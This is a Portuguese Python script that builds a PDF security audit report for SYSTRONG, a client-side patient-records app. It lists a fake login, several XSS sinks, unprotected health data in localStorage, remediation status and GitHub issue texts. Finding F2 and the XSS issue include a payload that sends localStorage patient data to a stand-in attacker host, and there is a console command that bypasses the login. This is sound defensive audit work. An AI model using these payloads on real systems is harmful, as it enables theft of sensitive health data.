#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gerador do Relatório de Auditoria de Segurança — SYSTRONG
===========================================================

Regenera docs/security-audit/relatorio-auditoria-seguranca.pdf a partir dos
achados fixados neste script (FINDINGS) e dos textos de metodologia,
pontos fortes/fracos, recomendações e issues do GitHub.

Uso:
    python -m venv .venv-audit
    ./.venv-audit/Scripts/python -m pip install reportlab matplotlib pillow
    ./.venv-audit/Scripts/python docs/security-audit/gerar_relatorio.py

Não requer nenhuma instalação global — todas as dependências ficam no venv
local ".venv-audit" (não versionado).
"""

import os
import tempfile
from xml.sax.saxutils import escape as _xml_escape

import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt

from reportlab.lib import colors
from reportlab.lib.pagesizes import A4
from reportlab.lib.units import cm
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.enums import TA_CENTER, TA_LEFT
from reportlab.platypus import (
    BaseDocTemplate, PageTemplate, Frame, Paragraph, Spacer, Table,
    TableStyle, Image, NextPageTemplate, PageBreak, KeepTogether,
    Preformatted, HRFlowable
)
from reportlab.pdfgen import canvas as pdfcanvas

# ---------------------------------------------------------------------------
# Constantes visuais
# ---------------------------------------------------------------------------

PROJETO = "SYSTRONG"
DATA_AUDITORIA = "29 de agosto de 2026"
NOME_RELATORIO = "Relatório de Auditoria de Segurança — SYSTRONG"
OUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_PDF = os.path.join(OUT_DIR, "relatorio-auditoria-seguranca.pdf")

COR_CRITICA = colors.HexColor("#B91C1C")
COR_ALTA = colors.HexColor("#EA580C")
COR_MEDIA = colors.HexColor("#D97706")
COR_BAIXA = colors.HexColor("#2563EB")
COR_INFO = colors.HexColor("#6B7280")
COR_FORTE = colors.HexColor("#059669")

COR_TEXTO = colors.HexColor("#1F2937")
COR_TEXTO_SUAVE = colors.HexColor("#4B5563")
COR_FUNDO_CAPA = colors.HexColor("#0B1220")
COR_ACENTO_CAPA = colors.HexColor("#00C2D1")

SEVERIDADE_COR = {
    "CRÍTICA": COR_CRITICA,
    "ALTA": COR_ALTA,
    "MÉDIA": COR_MEDIA,
    "BAIXA": COR_BAIXA,
    "INFORMATIVA": COR_INFO,
}

MARGEM = 2 * cm


def E(texto):
    """Escapa &, < e > de um texto livre antes de embuti-lo num Paragraph
    (que interpreta um subconjunto de HTML). Usar SEMPRE que o texto contiver
    trechos de código/markup citados literalmente (ex: '<img ...>', '`<br>`')."""
    return _xml_escape(str(texto))

# ---------------------------------------------------------------------------
# Dados: achados verificados
# ---------------------------------------------------------------------------
# categoria: 1=Isolamento de dados, 2=Permissão no navegador, 3=IDOR,
#            4=Chaves expostas, 5=XSS

FINDINGS = [
    {
        "id": "F1",
        "categoria": 2,
        "severidade": "CRÍTICA",
        "arquivo": "index.html:33,38 · js/app.js:154-168",
        "titulo": "Autenticação inteiramente decidida no navegador, sem qualquer verificação de credencial",
        "descricao": (
            "A tela de login não valida usuário/senha contra nada: fazerLogin() apenas checa "
            "se os dois campos não estão vazios (`if (usuario && senha)`) e, em caso positivo, "
            "seta `state.autenticado = true` e grava `systrong_auth=true` no localStorage. "
            "Não existe backend, API ou qualquer verificação server-side — o \"login\" é 100% "
            "decorativo. Os campos vêm inclusive pré-preenchidos com `value=\"admin\"` / "
            "`value=\"123456\"`, reforçando a falsa impressão de que há credenciais reais."
        ),
        "codigo": (
            'index.html:33  <input type="text" id="login-usuario" ... value="admin" required>\n'
            'index.html:38  <input type="password" id="login-senha" ... value="123456" required>\n'
            "js/app.js:160  if (usuario && senha) {\n"
            "js/app.js:161    state.autenticado = true;\n"
            "js/app.js:162    localStorage.setItem('systrong_auth', 'true');"
        ),
        "porque": (
            "Qualquer pessoa entra digitando qualquer texto nos dois campos — ou, sem nem "
            "abrir o formulário, executando `localStorage.setItem('systrong_auth','true')` no "
            "console do navegador e recarregando a página. Como toda a proteção de acesso à "
            "ficha clínica dos pacientes depende exclusivamente dessa flag booleana no cliente, "
            "não existe controle de acesso real no aplicativo."
        ),
        "condicoes": "Explorável sempre, sem pré-condição — é o comportamento padrão do código em produção.",
    },
    {
        "id": "F2",
        "categoria": 5,
        "severidade": "CRÍTICA",
        "arquivo": "js/app.js:1073-1120",
        "titulo": "XSS via chat do Nemotron AI — texto do usuário injetado com innerHTML",
        "descricao": (
            "enviarMensagemNemotron() lê o valor bruto do campo #input-nemotron e chama "
            "adicionarMensagemChatNemotron('user', texto), que grava o texto diretamente em "
            "`msgDiv.innerHTML` (apenas trocando quebras de linha por `<br>`, sem qualquer "
            "escaping de tags HTML)."
        ),
        "codigo": (
            "js/app.js:1076  const texto = input.value.trim();\n"
            "js/app.js:1080  adicionarMensagemChatNemotron('user', texto);\n"
            "js/app.js:1117  msgDiv.innerHTML = texto.replace(/\\n/g, '<br>');"
        ),
        "porque": (
            "Digitar `<img src=x onerror=fetch('https://atacante.exemplo/x?d='+"
            "localStorage.getItem('systrong_data'))>` no chat executa imediatamente no "
            "navegador da vítima, podendo exfiltrar todo o prontuário de pacientes salvo em "
            "localStorage (ver F9). É o ponto de XSS mais direto do aplicativo: entrada de "
            "texto livre, sem qualquer sanitização, renderizada de imediato."
        ),
        "condicoes": "Explorável sempre; não depende de feature flag ou configuração.",
    },
    {
        "id": "F3",
        "categoria": 5,
        "severidade": "ALTA",
        "arquivo": "js/app.js:406,420,562,571 · origem em js/app.js:751-780",
        "titulo": "XSS armazenado via nome do aluno e condição de saúde (ficha + relatório de impressão)",
        "descricao": (
            "salvarNovoAluno() grava `nome` e `condicaoSaude` no objeto do aluno sem qualquer "
            "sanitização. Esses campos são posteriormente injetados sem escaping em pelo menos "
            "quatro pontos via innerHTML: o cabeçalho da ficha (linha 406), o bloco de condição "
            "de saúde (linha 420) e o relatório de impressão (linhas 562 e 571)."
        ),
        "codigo": (
            "js/app.js:406  <h2>${aluno.nome} <span class=\"badge ...\n"
            "js/app.js:420  <p>${aluno.condicaoSaude}</p>\n"
            "js/app.js:762  const novoAluno = { id: ..., nome, ..., condicaoSaude, ... };"
        ),
        "porque": (
            "Um payload como `<img src=x onerror=alert(document.domain)>` como nome do aluno "
            "fica persistido em localStorage e executa toda vez que a ficha é aberta ou o "
            "relatório é impresso/exportado — inclusive para qualquer outra pessoa que use o "
            "mesmo navegador/perfil depois."
        ),
        "condicoes": "Explorável sempre pelo formulário 'Cadastrar Novo Aluno'.",
    },
    {
        "id": "F4",
        "categoria": 5,
        "severidade": "ALTA",
        "arquivo": "js/app.js:531-532 · origem em js/app.js:846-856,880-890",
        "titulo": "XSS armazenado via nome/observação de exercício na prescrição de treino",
        "descricao": (
            "salvarProgramaTreino() lê os campos `.ex-nome` do formulário de prescrição e grava "
            "sem sanitização; esses valores (`ex.nome`, `ex.obs`) são renderizados via innerHTML "
            "na tabela de exercícios."
        ),
        "codigo": (
            "js/app.js:531  <strong>${ex.nome}</strong>\n"
            "js/app.js:532  ${ex.obs ? `<br><small ...>${ex.obs}</small>` : ''}"
        ),
        "porque": (
            "Um nome de exercício como `<img src=x onerror=...>` persiste no programa de "
            "treino salvo e executa toda vez que a ficha do aluno é renderizada."
        ),
        "condicoes": "Explorável sempre pelo formulário 'Prescrever Novo Programa de Treino'.",
    },
    {
        "id": "F5",
        "categoria": 5,
        "severidade": "MÉDIA",
        "arquivo": "js/app.js:451 · origem em js/app.js:619-627,669-677",
        "titulo": "XSS armazenado via nome de arquivo anexado (upload / drag-and-drop)",
        "descricao": (
            "fazerUploadArquivoPaciente() e handleDropPaciente() usam `file.name` (controlado "
            "pelo nome do arquivo escolhido/arrastado pelo usuário) sem sanitização; o nome é "
            "depois renderizado via innerHTML na lista de documentos do paciente."
        ),
        "codigo": (
            "js/app.js:451  <strong ...>${arq.nome}</strong>\n"
            "js/app.js:623  nome: file.name,"
        ),
        "porque": (
            "Nomes de arquivo podem conter caracteres HTML dependendo da origem (drag-and-drop "
            "de outro app, arquivo extraído de um .zip em Linux/macOS, etc.). Um arquivo "
            "chamado `<img src=x onerror=alert(1)>.pdf` dispara XSS quando a ficha é aberta."
        ),
        "condicoes": (
            "Depende do SO/navegador permitir nomes de arquivo com caracteres HTML — Windows "
            "Explorer bloqueia alguns caracteres (`<>`), mas drag-and-drop de outras origens ou "
            "outros SOs não bloqueiam necessariamente."
        ),
    },
    {
        "id": "F6",
        "categoria": 5,
        "severidade": "MÉDIA",
        "arquivo": "js/app.js:915-928",
        "titulo": "XSS refletido no campo de busca do PubMed",
        "descricao": (
            "buscarPubMed() injeta o termo digitado (`termo`) sem escaping na mensagem de "
            "\"nenhum artigo encontrado\", via innerHTML."
        ),
        "codigo": (
            "js/app.js:916  const termo = document.getElementById('input-pubmed').value.trim();\n"
            "js/app.js:928  container.innerHTML = `<div class=\"vazio\">Nenhum artigo "
            "encontrado para \"${termo}\".</div>`;"
        ),
        "porque": (
            "Confirma a ausência sistemática de escaping no projeto. O impacto prático é baixo "
            "porque hoje o campo não é preenchido a partir da URL (sem parâmetro de query lido "
            "pela página), então a exploração fica restrita a self-XSS — mas o padrão de código "
            "é o mesmo reaproveitado nos pontos armazenados mais graves (F2-F5)."
        ),
        "condicoes": "Impacto real limitado hoje (self-XSS); risco sobe se o termo passar a ser lido de query string no futuro.",
    },
    {
        "id": "F7",
        "categoria": 5,
        "severidade": "BAIXA",
        "arquivo": "js/app.js:932-949",
        "titulo": "Dados de terceiros (API pública do NCBI/PubMed) renderizados sem sanitização",
        "descricao": (
            "`art.title` e `art.authors[0].name`, retornados pela API pública `esummary.fcgi` "
            "do NCBI, são concatenados em HTML e atribuídos via innerHTML sem qualquer "
            "escaping."
        ),
        "codigo": (
            "js/app.js:942  <a href=\"https://pubmed.ncbi.nlm.nih.gov/${id}/\" "
            "target=\"_blank\">${art.title}</a>\n"
            "js/app.js:943  Autores: ${art.authors?.[0]?.name || 'Et al.'}"
        ),
        "porque": (
            "A fonte é uma API pública respeitada e não há indício de que ela devolva HTML "
            "malicioso hoje, mas o app confia cegamente no conteúdo — não há defesa em "
            "profundidade caso a resposta um dia contenha marcação inesperada."
        ),
        "condicoes": "Depende do conteúdo retornado pela API do NCBI, fora do controle do projeto.",
    },
    {
        "id": "F8",
        "categoria": 4,
        "severidade": "INFORMATIVA",
        "arquivo": "js/nemotron-core.js:8,51-54",
        "titulo": "Chave de API do Nemotron, se configurada, ficaria em texto puro no localStorage",
        "descricao": (
            "NemotronCore expõe `setApiKey()/getApiKey()`, que gravam/leem a chave em "
            "`localStorage['systrong_nemotron_api_key']` sem qualquer cifragem. Não há valor "
            "hardcoded (default é string vazia) e, na interface atual, nenhum elemento chama "
            "`setApiKey()` — a funcionalidade existe no código mas não está exposta na UI hoje."
        ),
        "codigo": (
            "js/nemotron-core.js:8   this.apiKey = localStorage.getItem('systrong_nemotron_api_key') || '';\n"
            "js/nemotron-core.js:53  localStorage.setItem('systrong_nemotron_api_key', key);"
        ),
        "porque": (
            "Não é explorável hoje por não haver como o usuário configurar a chave pela UI. "
            "Fica registrado como ponto de atenção para quando essa tela for adicionada: uma "
            "chave em localStorage é legível por qualquer um dos XSS listados em F2-F6."
        ),
        "condicoes": "Não explorável na versão atual (nenhuma UI chama setApiKey()); vira risco real assim que essa tela for implementada.",
    },
    {
        "id": "F9",
        "categoria": 1,
        "severidade": "CRÍTICA",
        "arquivo": "js/app.js:7-14,17-112,122-126",
        "titulo": "Prontuário de todos os pacientes (PHI) guardado em um único localStorage sem controle de acesso real",
        "descricao": (
            "Todos os \"alunos/pacientes\" — nome, idade, condição de saúde, histórico de "
            "pressão arterial, documentos e programas de treino — ficam em um único array "
            "`state.alunos`, persistido inteiro em `localStorage['systrong_data']` "
            "(salvarEstado(), linha 123). Não existe conceito de dono/tenant nem de backend: "
            "a única barreira antes de ler esses dados é a tela de login, que é puramente "
            "cosmética (ver F1)."
        ),
        "codigo": (
            "js/app.js:123  localStorage.setItem('systrong_data', JSON.stringify(state.alunos));\n"
            "js/app.js:17   const demoData = [ { id: 'aluno-1', nome: 'Carlos Eduardo', ... "
            "condicaoSaude: 'Pós-operatório de ombro direito ... Hipertensão leve ...' } ];"
        ),
        "porque": (
            "Esse é o equivalente, nesta stack sem banco de dados, à falha de \"banco sem "
            "tranca\": não há isolamento nenhum por usuário/consultório, os dados clínicos "
            "ficam em texto puro no dispositivo, protegidos apenas por um login que não checa "
            "nada (F1) — e são diretamente legíveis/exfiltráveis por qualquer um dos XSS de "
            "F2 a F6 (`localStorage.getItem('systrong_data')`)."
        ),
        "condicoes": "Explorável sempre que o app for usado com dados reais de pacientes tal como está hoje (sem backend).",
    },
]

# Escapa campos de texto livre que vão para dentro de Paragraph (que interpreta
# um subconjunto de HTML) — o campo "codigo" fica intocado, pois é renderizado
# via Preformatted (texto literal, sem parsing de markup).
for _f in FINDINGS:
    for _k in ("titulo", "descricao", "porque", "condicoes", "arquivo"):
        _f[_k] = E(_f[_k])

CATEGORIA_NOME = {
    1: "Isolamento de Dados",
    2: "Permissão no Front-end",
    3: "IDOR",
    4: "Chaves Expostas",
    5: "XSS / Input sem Tratamento",
}

STRENGTHS = [
    (
        "Nenhum segredo real hardcoded no código-fonte nem no histórico do Git",
        "Varredura de todo o repositório (index.html, css/, js/, README, CNAME) e de "
        "`git log -p --all` não encontrou API keys, senhas ou tokens reais. "
        "js/nemotron-core.js:8 usa apenas `localStorage.getItem(...) || ''` — nunca um valor "
        "secreto embutido como default.",
    ),
    (
        "Nenhuma infraestrutura de servidor exposta no repositório",
        "Não há backend, banco de dados, Docker, docker-compose, CI/CD ou IaC no projeto — "
        "confirmado por varredura completa da árvore de arquivos. O app é 100% estático "
        "(HTML/CSS/JS) hospedado via GitHub Pages (CNAME → systrong.com.br), o que elimina "
        "de saída as categorias de risco de servidor/API.",
    ),
    (
        "Todas as chamadas de rede externas usam HTTPS",
        "Nenhuma URL http:// foi encontrada em index.html, css/styles.css ou js/*.js — as "
        "chamadas à API do NCBI PubMed (js/app.js:923,932) e ao endpoint da NVIDIA NIM "
        "(js/nemotron-core.js:10) usam https:// exclusivamente.",
    ),
    (
        "Parâmetro de busca corretamente codificado na URL da API PubMed",
        "js/app.js:923 usa `encodeURIComponent(termo)` ao montar a query string, prevenindo "
        "quebra da URL/injeção de parâmetros na chamada à API do NCBI.",
    ),
    (
        "`.gitignore` presente e adequado",
        "Cobre artefatos de SO, IDE e build (.DS_Store, .vscode/, node_modules/, dist/, etc.), "
        "reduzindo o risco de arquivos sensíveis serem versionados por acidente.",
    ),
]
STRENGTHS = [(E(t), E(e)) for t, e in STRENGTHS]

WEAKNESSES = [
    "A tela de login não autentica nada — qualquer texto não vazio nos dois campos entra no "
    "sistema, e não existe backend nenhum para checar credenciais (F1).",
    "Múltiplos pontos usam `innerHTML` com dados de entrada do usuário sem qualquer "
    "sanitização ou biblioteca de escaping — não há DOMPurify, `textContent` seguro nem "
    "função de escape em nenhum lugar do projeto (F2-F7).",
    "Todo o prontuário clínico de todos os pacientes fica em um único blob de localStorage, "
    "sem isolamento por usuário/consultório e protegido apenas pelo login cosmético (F9).",
    "A combinação F1 + F2-F6 + F9 forma uma cadeia completa de exfiltração: qualquer XSS "
    "armazenado permite ler `localStorage.getItem('systrong_data')` e enviar todo o "
    "prontuário de pacientes para um servidor externo, sem exigir nenhuma autenticação real.",
]
WEAKNESSES = [E(w) for w in WEAKNESSES]

RECOMENDACOES = {
    "P1 — Crítico, agir imediatamente": [
        "Não usar este aplicativo com dados reais de pacientes enquanto a autenticação for "
        "puramente client-side (F1) — se o produto for seguir em frente, implementar um "
        "backend com autenticação de verdade (hash de senha + sessão/token) antes de "
        "qualquer dado clínico real trafegar pelo sistema.",
        "Escapar/sanitizar TODO input do usuário antes de qualquer `innerHTML`: nome do "
        "aluno, condição de saúde, nome/observação de exercício, nome de arquivo e texto do "
        "chat Nemotron (F2-F5). Usar `textContent` para texto puro ou uma função central "
        "`escapeHtml()`; para o chat (que precisa converter `\\n` em `<br>`), sanitizar com "
        "DOMPurify em vez de montar HTML manualmente.",
        "Não persistir PHI (dado de saúde) real em localStorage sem um backend com controle "
        "de acesso e criptografia em repouso — dado de saúde é \"dado sensível\" pela LGPD "
        "(art. 5º, II), o que exige base legal e salvaguardas específicas (F9).",
    ],
    "P2 — Alto/Médio, próximos sprints": [
        "Sanitizar também os dados vindos da API pública do PubMed antes de renderizar, como "
        "defesa em profundidade (F7).",
        "Adicionar uma Content-Security-Policy restritiva (meta tag `script-src 'self'`, sem "
        "`unsafe-inline` para scripts) para reduzir o impacto de qualquer XSS residual.",
        "Se a tela de configuração da chave do Nemotron for implementada no futuro, deixar "
        "claro ao usuário que a chave fica no navegador local e considerar um proxy backend "
        "em vez de chamar a API da NVIDIA diretamente do cliente (F8).",
    ],
    "P3 — Baixo/Melhoria contínua": [
        "Adicionar testes automatizados cobrindo os pontos de renderização de dados do "
        "usuário, para impedir regressão de XSS em mudanças futuras.",
        "Deixar explícito no README que, no estado atual, o app é um protótipo/demo "
        "client-side sem persistência segura — não apto a dados clínicos reais.",
    ],
}
RECOMENDACOES = {k: [E(i) for i in v] for k, v in RECOMENDACOES.items()}

# ---------------------------------------------------------------------------
# Status de remediação (aplicado em sessão de correção posterior à auditoria)
# ---------------------------------------------------------------------------

REMEDIACAO = {
    "F1": ("MITIGADO", COR_MEDIA,
           "Credenciais falsas `admin`/`123456` pré-preenchidas foram removidas de "
           "index.html, e um aviso explícito foi adicionado na própria tela de login e no "
           "README informando que não há autenticação real. A causa raiz (ausência de "
           "backend) permanece — só é resolvida por completo com um backend real."),
    "F2": ("CORRIGIDO", COR_FORTE,
           "js/app.js — adicionada função `escapeHtml()` central; `adicionarMensagemChatNemotron()` "
           "agora escapa todo texto (usuário e IA) antes de aplicar `innerHTML`."),
    "F3": ("CORRIGIDO", COR_FORTE,
           "js/app.js — `aluno.nome` e `aluno.condicaoSaude` agora passam por `escapeHtml()` "
           "em todos os pontos de renderização (lista, ficha, cabeçalhos e relatório de impressão)."),
    "F4": ("CORRIGIDO", COR_FORTE,
           "js/app.js — `ex.nome` e `ex.obs` agora passam por `escapeHtml()` na tabela de exercícios."),
    "F5": ("CORRIGIDO", COR_FORTE,
           "js/app.js — `arq.nome`/`a.nome` (nome de arquivo) agora passam por `escapeHtml()` "
           "na lista de documentos e no relatório de impressão."),
    "F6": ("CORRIGIDO", COR_FORTE,
           "js/app.js — o termo de busca do PubMed agora passa por `escapeHtml()` antes de "
           "ser refletido na mensagem de \"nenhum resultado\"."),
    "F7": ("CORRIGIDO", COR_FORTE,
           "js/app.js — `art.title`, autor, `pubdate` e o `id` da API do PubMed agora passam "
           "por `escapeHtml()`/`encodeURIComponent()` antes de renderizar."),
    "F8": ("SEM AÇÃO NECESSÁRIA POR ORA", COR_INFO,
           "Não explorável hoje (nenhuma UI chama `setApiKey()`). Adicionado comentário de "
           "alerta em js/nemotron-core.js orientando a usar um proxy backend quando essa "
           "tela for implementada."),
    "F9": ("MITIGADO", COR_MEDIA,
           "Mesma mitigação de F1 (aviso explícito no login e no README de que não há "
           "isolamento real de dados). A causa raiz (armazenamento local sem backend) só é "
           "resolvida por completo com um backend com autenticação/autorização real."),
}

# ---------------------------------------------------------------------------
# Issues para o GitHub
# ---------------------------------------------------------------------------
# Nota: "titulo" e "labels" são usados dentro de Paragraph (escapados abaixo);
# "corpo" é renderizado via Preformatted (texto literal em Markdown/código, sem
# parsing de HTML) e por isso permanece intocado.

ISSUES = [
    {
        "titulo": "[Segurança] Autenticação 100% client-side permite bypass total do login",
        "labels": "security, critical",
        "corpo": """## Problema

A tela de login do SYSTRONG não valida usuário/senha contra nada. `fazerLogin()` só checa se
os dois campos não estão vazios e, em caso positivo, marca `state.autenticado = true` e grava
`systrong_auth=true` no `localStorage`. Não existe backend nem API para validar a credencial —
o "login" é puramente decorativo, inclusive com campos pré-preenchidos `value="admin"` /
`value="123456"` que reforçam a falsa sensação de segurança.

## Por que é explorável

Qualquer pessoa entra digitando qualquer texto nos dois campos, ou nem precisa disso: basta
rodar no console do navegador `localStorage.setItem('systrong_auth','true')` e recarregar a
página. Toda a proteção de acesso à ficha clínica dos pacientes depende exclusivamente dessa
flag booleana controlada pelo próprio cliente.

## Evidência

`index.html:33`
```html
<input type="text" id="login-usuario" placeholder="admin" value="admin" required>
```

`index.html:38`
```html
<input type="password" id="login-senha" placeholder="••••••••" value="123456" required>
```

`js/app.js:160-164`
```js
if (usuario && senha) {
  state.autenticado = true;
  localStorage.setItem('systrong_auth', 'true');
  ...
}
```

## Impacto

Qualquer pessoa com acesso ao link do app acessa 100% dos dados clínicos de todos os
pacientes cadastrados, sem nenhuma credencial válida.

## Sugestão de correção

- Implementar um backend real com autenticação (hash de senha + sessão/token) antes de
  qualquer dado clínico real trafegar pelo sistema.
- Enquanto isso não existir, deixar claro na UI/README que o app não tem controle de acesso
  real e não deve ser usado com dados reais de pacientes.
- Remover os valores `value="admin"`/`value="123456"` pré-preenchidos, que sugerem uma
  credencial real inexistente.

## Critérios de aceite

- [ ] Login rejeita credenciais inválidas contra uma fonte de verdade real (backend/hash)
- [ ] Não é mais possível obter acesso setando apenas uma flag no localStorage
- [ ] Campos de login não vêm mais pré-preenchidos com credenciais falsas
- [ ] README atualizado descrevendo o mecanismo de autenticação real (ou o aviso de que o
      app é apenas um protótipo sem controle de acesso, se essa for a decisão do time)
""",
    },
    {
        "titulo": "[Segurança] Múltiplos pontos de XSS armazenado/refletido via innerHTML sem sanitização",
        "labels": "security, critical, high",
        "corpo": """## Problema

O projeto não possui nenhuma função de escaping HTML nem biblioteca de sanitização (sem
DOMPurify, sem `escapeHtml()`). Vários pontos do app montam HTML por template string com
dados vindos diretamente do usuário (ou de arquivos escolhidos pelo usuário) e atribuem o
resultado via `innerHTML`, permitindo XSS armazenado em pelo menos 4 pontos e refletido em
1 ponto.

## Por que é explorável

Como não há nenhum escaping em nenhum desses pontos, qualquer um deles aceita um payload como
`<img src=x onerror=fetch('https://atacante.exemplo/x?d='+localStorage.getItem('systrong_data'))>`
e o executa assim que o HTML é renderizado. Os pontos armazenados persistem o payload em
`localStorage`, então ele volta a executar toda vez que a ficha/relatório é aberto — inclusive
por outra pessoa usando o mesmo navegador depois.

## Evidência

**Chat do Nemotron (crítica)** — `js/app.js:1076,1080,1117`
```js
const texto = input.value.trim();
adicionarMensagemChatNemotron('user', texto);
...
msgDiv.innerHTML = texto.replace(/\\n/g, '<br>');
```

**Nome/condição de saúde do aluno (alta)** — `js/app.js:406,420`
```js
<h2>${aluno.nome} <span class="badge ...
<p>${aluno.condicaoSaude}</p>
```
também refletido no relatório de impressão em `js/app.js:562,571`.

**Nome/observação de exercício (alta)** — `js/app.js:531-532`
```js
<strong>${ex.nome}</strong>
${ex.obs ? `<br><small ...>${ex.obs}</small>` : ''}
```

**Nome de arquivo anexado (média)** — `js/app.js:451`, origem em `js/app.js:623,673`
```js
<strong ...>${arq.nome}</strong>
...
nome: file.name,
```

**Termo de busca PubMed (média, refletido)** — `js/app.js:928`
```js
container.innerHTML = `<div class="vazio">Nenhum artigo encontrado para "${termo}".</div>`;
```

**Título/autor retornados pela API do PubMed (baixa)** — `js/app.js:942-943`
```js
<a href="..." target="_blank">${art.title}</a>
Autores: ${art.authors?.[0]?.name || 'Et al.'}
```

## Impacto

Execução de JavaScript arbitrário no navegador de quem abre a ficha/relatório/chat afetado,
com acesso total ao `localStorage` do app — incluindo o prontuário de todos os pacientes
(`systrong_data`, ver issue de isolamento de dados) e, se configurada no futuro, a chave de
API do Nemotron.

## Sugestão de correção

- Trocar `innerHTML` por `textContent` em todo ponto que só precisa exibir texto puro (nome,
  condição de saúde, nome de exercício/arquivo, título/autor do PubMed).
- Para o chat do Nemotron (que precisa converter `\\n` em `<br>`), usar uma função de
  sanitização (ex.: DOMPurify) em vez de montar HTML manualmente, ou construir os nós DOM
  diretamente (`document.createElement` + `textContent`, inserindo `<br>` via `appendChild`).
- Adicionar uma Content-Security-Policy (`script-src 'self'`) como camada extra de defesa.

## Critérios de aceite

- [ ] Nenhum dos 6 pontos listados acima renderiza HTML/JS a partir de um payload como
      `<img src=x onerror=alert(1)>` inserido nos respectivos campos
- [ ] Existe uma função central de escaping (ou lib de sanitização) reutilizada nos pontos
      corrigidos
- [ ] Teste manual/automatizado cobrindo ao menos o campo de nome do aluno e o chat do
      Nemotron
""",
    },
    {
        "titulo": "[Segurança] Prontuário de pacientes (PHI) em localStorage sem isolamento nem controle de acesso real",
        "labels": "security, critical",
        "corpo": """## Problema

Todos os dados de todos os "alunos/pacientes" — nome, idade, condição de saúde, histórico de
pressão arterial, documentos anexados e programas de treino — são guardados em um único array
`state.alunos`, persistido inteiro em `localStorage['systrong_data']`. Não existe conceito de
dono/tenant nem backend: a única barreira antes de ler esses dados é a tela de login, que é
puramente cosmética (ver issue de autenticação).

## Por que é explorável

Como o "login" não protege nada de verdade e o `localStorage` fica em texto puro no
dispositivo, qualquer pessoa com acesso ao navegador/perfil (ou explorando qualquer um dos
XSS reportados) lê e exfiltra o prontuário completo de todos os pacientes com um simples
`localStorage.getItem('systrong_data')`.

## Evidência

`js/app.js:123`
```js
localStorage.setItem('systrong_data', JSON.stringify(state.alunos));
```

`js/app.js:17-24` (exemplo de dado sensível já presente por padrão)
```js
const demoData = [
  { id: 'aluno-1', nome: 'Carlos Eduardo', idade: 42, ...
    condicaoSaude: 'Pós-operatório de ombro direito (manguito rotador). Hipertensão leve sob medicação.',
    ...
```

## Impacto

Exposição total de dados de saúde ("dado sensível" pela LGPD, art. 5º, II) de todos os
pacientes cadastrados, sem exigir nenhuma autenticação real e sem qualquer segmentação por
usuário/consultório.

## Sugestão de correção

- Não usar este armazenamento para dados reais de pacientes enquanto não houver backend com
  autenticação, autorização por usuário/tenant e criptografia em repouso.
- Se o produto seguir client-side por enquanto, deixar isso explícito para quem for usar o
  sistema (aviso na UI/README) e não popular a base com dados reais.
- Priorizar a correção da issue de XSS antes de qualquer uso com dados reais, já que ela é o
  vetor mais direto de exfiltração deste armazenamento.

## Critérios de aceite

- [ ] Dados reais de pacientes só são persistidos depois de existir um backend com
      autenticação e autorização por usuário/tenant
- [ ] Enquanto isso não existir, README/UI avisam claramente que o app é um protótipo sem
      controle de acesso real, não apto a dados clínicos reais
""",
    },
    {
        "titulo": "[Segurança] Preparar tratamento seguro da chave de API do Nemotron antes de expor essa tela na UI",
        "labels": "security, low",
        "corpo": """## Problema

`NemotronCore` já expõe `setApiKey()`/`getApiKey()`, que gravam/leem a chave de API da NVIDIA
NIM em `localStorage['systrong_nemotron_api_key']` sem qualquer cifragem. Hoje nenhuma tela da
interface chama `setApiKey()` — a funcionalidade existe apenas no código, não é explorável na
versão atual.

## Por que é relevante

Assim que uma tela de configuração dessa chave for adicionada, ela ficará em texto puro no
`localStorage`, legível por qualquer um dos XSS reportados na issue de sanitização de input.
Registrar isso agora evita que o problema seja introduzido "de graça" junto com a nova tela.

## Evidência

`js/nemotron-core.js:8`
```js
this.apiKey = localStorage.getItem('systrong_nemotron_api_key') || '';
```

`js/nemotron-core.js:51-54`
```js
setApiKey(key) {
  this.apiKey = key;
  localStorage.setItem('systrong_nemotron_api_key', key);
}
```

## Impacto

Nenhum hoje (funcionalidade não exposta na UI). Risco passa a ser real assim que uma tela de
configuração for adicionada, especialmente combinado com os pontos de XSS já reportados.

## Sugestão de correção

- Ao implementar a UI de configuração da chave, considerar um proxy backend (a chave nunca
  chega ao navegador) em vez de chamar a API da NVIDIA diretamente do cliente.
- Se optar por manter client-side, avisar explicitamente o usuário de que a chave fica no
  navegador local e corrigir primeiro os pontos de XSS da issue correspondente.

## Critérios de aceite

- [ ] Antes de expor `setApiKey()` na UI, a issue de XSS deste repositório está fechada
- [ ] Decisão de arquitetura (proxy backend vs. client-side) documentada antes da
      implementação da tela
""",
    },
]
for _i in ISSUES:
    _i["titulo"] = E(_i["titulo"])
    _i["labels"] = E(_i["labels"])

# ---------------------------------------------------------------------------
# Gráficos (matplotlib -> PNG)
# ---------------------------------------------------------------------------

def gerar_grafico_rosca(path_png):
    ordem = ["CRÍTICA", "ALTA", "MÉDIA", "BAIXA", "INFORMATIVA"]
    contagem = {s: 0 for s in ordem}
    for f in FINDINGS:
        contagem[f["severidade"]] += 1

    valores = [contagem[s] for s in ordem]
    cores = [SEVERIDADE_COR[s].hexval() if hasattr(SEVERIDADE_COR[s], "hexval") else None for s in ordem]
    cores = ["#B91C1C", "#EA580C", "#D97706", "#2563EB", "#6B7280"]

    labels = [f"{s.title()} ({v})" for s, v in zip(ordem, valores)]
    # remove zero-count slices from the legend/plot to avoid clutter
    plot_vals, plot_cores, plot_labels = [], [], []
    for v, c, l in zip(valores, cores, labels):
        if v > 0:
            plot_vals.append(v)
            plot_cores.append(c)
            plot_labels.append(l)

    fig, ax = plt.subplots(figsize=(4.6, 4.0), dpi=200)
    wedges, _ = ax.pie(
        plot_vals, colors=plot_cores, startangle=90, counterclock=False,
        wedgeprops=dict(width=0.42, edgecolor="white", linewidth=2),
    )
    ax.set_aspect("equal")
    total = sum(plot_vals)
    ax.text(0, 0.06, str(total), ha="center", va="center", fontsize=26, fontweight="bold", color="#1F2937")
    ax.text(0, -0.16, "achados", ha="center", va="center", fontsize=11, color="#4B5563")

    ax.legend(
        wedges, plot_labels, loc="center left", bbox_to_anchor=(1.0, 0.5),
        frameon=False, fontsize=10,
    )
    fig.suptitle("Achados por Severidade", fontsize=13, fontweight="bold", color="#1F2937", y=0.98)
    fig.tight_layout()
    fig.savefig(path_png, bbox_inches="tight", transparent=True)
    plt.close(fig)


def gerar_grafico_barras(path_png):
    import textwrap

    ordem_sev = ["CRÍTICA", "ALTA", "MÉDIA", "BAIXA", "INFORMATIVA"]
